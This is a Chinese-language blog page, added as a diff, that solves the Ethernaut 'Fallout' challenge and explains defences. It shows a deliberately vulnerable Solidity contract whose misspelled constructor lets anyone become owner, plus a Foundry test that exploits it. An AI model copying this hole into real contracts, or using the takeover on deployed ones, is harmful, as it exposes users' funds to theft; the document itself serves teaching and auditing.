@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 2: Fallout - 构造函数命名漏洞 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-2-Fallout-构造函数命名漏洞"><a href="#🎯-Ethernaut-Level-2-Fallout-构造函数命名漏洞" class="headerlink" title="🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞"></a>🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/2">Ethernaut Level 2 - Fallout</a><br><strong>攻击类型</strong>: 构造函数命名错误、历史漏洞<br><strong>难度</strong>: ⭐☆☆☆☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>这个关卡考查的是开发者在代码编写中的细心程度：</p>
+<ol>
+<li><strong>获取合约控制权</strong> - 成为合约的 <code>owner</code></li>
+<li><strong>理解历史漏洞</strong> - 学习 Solidity 早期版本的安全问题</li>
+</ol>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><h3 id="合约源码分析"><a href="#合约源码分析" class="headerlink" title="合约源码分析"></a>合约源码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    </span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    mapping (address =&gt; uint) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;  // 🚨 注意这里的拼写！</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞识别"><a href="#漏洞识别" class="headerlink" title="漏洞识别"></a>漏洞识别</h3><p>仔细观察合约代码，我们发现一个<strong>极其微妙但致命的错误</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 合约名称</span><br><span class="line">contract Fallout &#123;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;  // ❌ 这里是 &quot;Fal1out&quot; (数字1)</span><br><span class="line">        owner = msg.sender;             // 而不是 &quot;Fallout&quot; (字母l)</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="历史背景"><a href="#历史背景" class="headerlink" title="历史背景"></a>历史背景</h3><p>在 <strong>Solidity 0.4.22</strong> 之前，构造函数的定义方式是：</p>
+<ul>
+<li>创建一个与合约名称<strong>完全相同</strong>的函数</li>
+<li>该函数会在合约部署时自动执行一次</li>
+</ul>
+<p>但在这个合约中：</p>
+<ul>
+<li>合约名称是 <code>Fallout</code>（字母 l）</li>
+<li>函数名称是 <code>Fal1out</code>（数字 1）</li>
+</ul>
+<p><strong>结果</strong>: 这个函数不是构造函数，而是一个<strong>普通的公开函数</strong>！</p>
+<h3 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h3><ol>
+<li><strong>识别伪装的构造函数</strong> - 发现 <code>Fal1out()</code> 函数可以被任何人调用</li>
+<li><strong>直接调用函数</strong> - 调用 <code>Fal1out()</code> 成为 <code>owner</code></li>
+<li><strong>验证权限获取</strong> - 确认已获得合约控制权</li>
+</ol>
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Fallout.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FalloutTest is Test &#123;</span><br><span class="line">    Fallout public instance;</span><br><span class="line">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 部署目标合约</span><br><span class="line">        instance = new Fallout();</span><br><span class="line">        </span><br><span class="line">        // 给攻击者一些初始资金</span><br><span class="line">        vm.deal(attacker, 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testFalloutExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Original owner:&quot;, instance.owner());</span><br><span class="line">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class="line">        </span><br><span class="line">        // 攻击步骤：直接调用错误命名的&quot;构造函数&quot;</span><br><span class="line">        instance.Fal1out&#123;value: 0.001 ether&#125;();</span><br><span class="line">        </span><br><span class="line">        // 验证攻击成功</span><br><span class="line">        assertEq(instance.owner(), attacker);</span><br><span class="line">        console.log(&quot;New owner:&quot;, instance.owner());</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testOriginalOwnerIsZero() public view &#123;</span><br><span class="line">        // 验证合约部署后没有owner（因为构造函数未执行）</span><br><span class="line">        assertEq(instance.owner(), address(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 Fallout 关卡测试</span></span><br><span class="line">forge <span class="built_in">test</span> --match-contract FalloutTest -vvv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预期输出：</span></span><br><span class="line"><span class="comment"># [PASS] testFalloutExploit()</span></span><br><span class="line"><span class="comment"># [PASS] testOriginalOwnerIsZero()</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="现代-Solidity-解决方案"><a href="#现代-Solidity-解决方案" class="headerlink" title="现代 Solidity 解决方案"></a>现代 Solidity 解决方案</h3><p>从 <strong>Solidity 0.4.22</strong> 开始，引入了 <code>constructor</code> 关键字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SecureFallout &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping (address =&gt; uint) allocations;</span><br><span class="line">    </span><br><span class="line">    // ✅ 使用 constructor 关键字</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 其他函数...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="安全最佳实践"><a href="#安全最佳实践" class="headerlink" title="安全最佳实践"></a>安全最佳实践</h3><ol>
+<li><p><strong>使用现代语法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// ❌ 旧版本（容易出错）</span><br><span class="line">function ContractName() public &#123;</span><br><span class="line">    // 构造逻辑</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ✅ 新版本（明确且安全）</span><br><span class="line">constructor() &#123;</span><br><span class="line">    // 构造逻辑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>代码审计检查清单</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 检查项目：</span><br><span class="line">// ✅ 构造函数名称与合约名称是否完全匹配</span><br><span class="line">// ✅ 是否使用了现代 constructor 语法</span><br><span class="line">// ✅ 是否有多个类似构造函数的函数</span><br><span class="line">// ✅ 权限初始化是否正确执行</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>编译器警告</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 现代编译器会对可疑的函数名发出警告</span></span><br><span class="line">Warning: Function state mutability can be restricted to pure</span><br><span class="line">Warning: This <span class="keyword">function</span> has the same name as the contract</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="📚-核心知识点"><a href="#📚-核心知识点" class="headerlink" title="📚 核心知识点"></a>📚 核心知识点</h2><h3 id="1-Solidity-版本演进"><a href="#1-Solidity-版本演进" class="headerlink" title="1. Solidity 版本演进"></a>1. Solidity 版本演进</h3><table>
+<thead>
+<tr>
+<th>版本</th>
+<th>构造函数语法</th>
+<th>安全性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt; 0.4.22</td>
+<td><code>function ContractName()</code></td>
+<td>❌ 容易拼写错误</td>
+</tr>
+<tr>
+<td>&gt;&#x3D; 0.4.22</td>
+<td><code>constructor()</code></td>
+<td>✅ 明确且安全</td>
+</tr>
+</tbody></table>
+<h3 id="2-常见命名错误"><a href="#2-常见命名错误" class="headerlink" title="2. 常见命名错误"></a>2. 常见命名错误</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract &#123;</span><br><span class="line">    // ❌ 常见错误类型</span><br><span class="line">    function MyContracr() public &#123; &#125;  // 拼写错误</span><br><span class="line">    function myContract() public &#123; &#125;  // 大小写错误</span><br><span class="line">    function MyContract_() public &#123; &#125; // 多余字符</span><br><span class="line">    function MyContract() public &#123; &#125;  // 可能正确，但不推荐</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-代码审计重点"><a href="#3-代码审计重点" class="headerlink" title="3. 代码审计重点"></a>3. 代码审计重点</h3><ul>
+<li><strong>字符相似性检查</strong> - 1 vs l, 0 vs O</li>
+<li><strong>大小写敏感性</strong> - Solidity 区分大小写</li>
+<li><strong>额外字符检查</strong> - 下划线、空格等</li>
+<li><strong>编码问题</strong> - Unicode 字符混用</li>
+</ul>
+<h2 id="🔍-实际案例分析"><a href="#🔍-实际案例分析" class="headerlink" title="🔍 实际案例分析"></a>🔍 实际案例分析</h2><h3 id="历史上的类似漏洞"><a href="#历史上的类似漏洞" class="headerlink" title="历史上的类似漏洞"></a>历史上的类似漏洞</h3><ol>
+<li><p><strong>Rubixi 智能合约</strong> (2016)</p>
+<ul>
+<li>合约从 <code>DynamicPyramid</code> 重命名为 <code>Rubixi</code></li>
+<li>忘记更新构造函数名称</li>
+<li>导致任何人都可以成为 owner</li>
+</ul>
+</li>
+<li><p><strong>其他类似案例</strong></p>
+<ul>
+<li>复制粘贴代码时忘记修改函数名</li>
+<li>团队协作中的沟通失误</li>
+<li>自动化重构工具的缺陷</li>
+</ul>
+</li>
+</ol>
+<h3 id="漏洞影响评估"><a href="#漏洞影响评估" class="headerlink" title="漏洞影响评估"></a>漏洞影响评估</h3><ul>
+<li><strong>直接影响</strong>: 完全丧失合约控制权</li>
+<li><strong>资金风险</strong>: 合约中的所有资金</li>
+<li><strong>修复难度</strong>: 无法修复，需要重新部署</li>
+<li><strong>检测难度</strong>: 极低，但容易被忽视</li>
+</ul>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p>Fallout 关卡展示了一个看似微不足道但后果严重的漏洞：</p>
+<ul>
+<li>✅ <strong>细节决定成败</strong> - 一个字符的差异导致完全不同的结果</li>
+<li>✅ <strong>工具的重要性</strong> - 现代编译器和工具可以避免此类错误</li>
+<li>✅ <strong>代码审计的价值</strong> - 人工审计能发现工具遗漏的问题</li>
+<li>✅ <strong>版本升级的必要性</strong> - 使用最新的安全特性</li>
+</ul>
+<p>这个案例提醒我们，在智能合约开发中，<strong>没有小错误，只有大损失</strong>。</p>
+<hr>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
+<li><strong><a href="/2025/01/25/ethernaut-level-01-fallback/">上一关: Level 1 - Fallback</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-03-coinflip/">下一关: Level 3 - Coin Flip</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列目录: Ethernaut Foundry Solutions</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub 项目</a></strong></li>
+</ul>
+<hr>
+<p><em>魔鬼藏在细节中，安全始于每一个字符。</em> 🔍</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3安全</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/%E5%91%BD%E5%90%8D%E6%BC%8F%E6%B4%9E/" rel="tag">#命名漏洞</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a> <a class="tag-none-link" href="/tags/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/" rel="tag">#构造函数</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
